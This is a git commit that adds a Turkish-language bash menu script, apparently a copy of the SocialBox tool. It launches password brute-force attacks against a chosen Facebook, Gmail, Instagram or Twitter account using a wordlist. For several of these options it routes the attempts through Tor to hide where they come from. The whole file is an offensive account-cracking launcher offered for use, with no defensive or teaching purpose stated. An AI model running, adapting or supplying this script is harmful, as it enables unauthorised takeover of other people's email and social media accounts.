3de2e9cc142fdce44bc859bd635648950139b8ec
!`Script <76524734+Teryun23@users.noreply.github.com>
2022-01-31 13:31:13 +0300

    Add files via upload

---
+++ Script-BruteForce Attack/script -Burte-force.sh
@@ -0,0 +1,185 @@
+#!/bin/bash
+#Colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+nc="\e[0m"
+
+       echo -e "$red coded by script.$nc"
+
+#Installation
+sleep 1
+echo -e "Checking Installation $nc"
+bash install-sb.sh >> /dev/null
+echo -e "Checking Completed [$green✓$nc] $nc "
+sleep 1
+clear
+#Startup
+echo -e "Hello"
+echo "   ▄████████  ▄████████    ▄████████  ▄█     ▄███████▄     ███ "    
+echo "  ███    ███ ███    ███   ███    ███ ███    ███    ███ ▀█████████▄ "
+echo "  ███    █▀  ███    █▀    ███    ███ ███▌   ███    ███    ▀███▀▀██ "
+echo "  ███        ███         ▄███▄▄▄▄██▀ ███▌   ███    ███     ███   ▀ "
+echo "▀███████████ ███        ▀▀███▀▀▀▀▀   ███▌ ▀█████████▀      ███  "   
+echo "         ███ ███    █▄  ▀███████████ ███    ███            ███  "   
+echo "   ▄█    ███ ███    ███   ███    ███ ███    ███            ███  "   
+echo " ▄████████▀  ████████▀    ███    ███ █▀    ▄████▀         ▄████▀ "  
+echo -e "                       ███    ███$nc ozbir sj $nc"                               
+
+echo -e "	[+]              $red Coded By Script$nc         		   [+]"
+#echo -e "	[+] 		 $red samsesh.net $nc 		   [+]"
+#echo -e "	[+] 		 $red Greetz To All Pentesters$nc          		   [+]"
+#echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles, samsesh}$nc [+]"
+echo ""
+echo -e "$yellow Select From Menu : $nc"
+echo ""
+echo -e "		$Cyan 1 : Brute Force Facebook Hesabı$nc"
+echo -e "		$Cyan 2 : Brute Force Gmail Hesabı$nc"
+echo -e "		$Cyan 3 : Brute Force Instagram Hesabı 1$nc"
+echo -e "		$Cyan 4 : Brute Force Twitter Hesabı$nc"
+echo -e "		$Cyan 5 : Brute Force Instagram Hesabı 2 $nc"
+echo -e "		$Cyan 99: Cıkış Yap$nc"
+read -p "Choice >  " ch
+if [ $ch = 1 ]; then
+echo -e "			$Cyan Facebook Brute Force$nc"
+echo -e "$green"
+read -p "Enter Facebook ID / Email / Username / Number: " id
+read -p "Enter wordlist path : " wordlist
+echo -e "$nc"
+cd facebook
+perl fb-brute.pl $id $wordlist
+echo -e " 		[+]$yellow Brute Force Tamamlandı $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Ana Menüye Dönmek İstermisiniz [ Y / n ] : " check
+echo -e "$nc"
+if [ $check = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 2 ]; then
+echo -e "			$Cyan Gmail Brute Force$nc"
+cd Gemail-Hack
+python2 gemailhack.py
+echo -e "               [+]$yellow Brute Force Tamamlandı $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Ana Menüye Dönmek İstermisiniz [ Y / n ] : " check2
+echo -e "$nc"
+if [ $check2 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 3 ]; then
+echo -e "			$Cyan Instagram Brute Force 1$nc"
+cd instainsane/
+sleep 0.025
+	echo -e "	[+]$red tor $nc[+]"
+sleep 0.9
+sv tor start
+./instainsane.sh
+echo -e "               [+]$yellow Brute Force Tamamlandı $nc[$green✓$nc] $nc[+]"
+sv tor stop
+#echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Ana Menüye Dönmek İstermisiniz [ Y / n ] : " check3
+echo -e "$nc"
+if [ $check3 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 4 ]; then
+echo -e "			$Cyan Twitter Brute Force$nc"
+cd tweetshell/
+sleep 0.025
+        echo -e "	[+]$red Service Tor Stated $nc[+]"
+sleep 0.9
+sv tor start
+bash tweetshell.sh
+echo -e "               [+]$yellow Brute Force Tamamlandı $nc[$green✓$nc] $nc[+]"
+sv tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Ana Menüye Dönmek İster misiniz ? [ Y / n ] : " check4
+echo -e "$nc"
+if [ $check4 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 5 ]; then
+echo -e "			$Cyan Instagram Brute Force 2$nc"
+cd insta-bf/
+sleep 0.025
+        echo -e "	[+]$red Servis Tor Başlatıldı $nc[+]"
+sleep 0.9
+sv tor start
+python instabf.py
+echo -e "               [+]$yellow Brute Force Tamamlandı $nc[$green✓$nc] $nc[+]"
+sv tor stop
+echo -e "		[+]$red Servis Tor Durduruldu$nc [+]"
+echo -e "$red"
+read -p "Ana Menüye Dönmek İster misiniz ? [ Y / n ] : " check5
+echo -e "$nc"
+if [ $check5 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check5 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check5 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check5 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check5 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch == 99 ]; then
+echo -e "$red Program Çıkıyor ...$nc"
+sleep 0.25
+exit 1
+else
+echo "Not Found 404 , Çıkış"
+exit 1
+fi
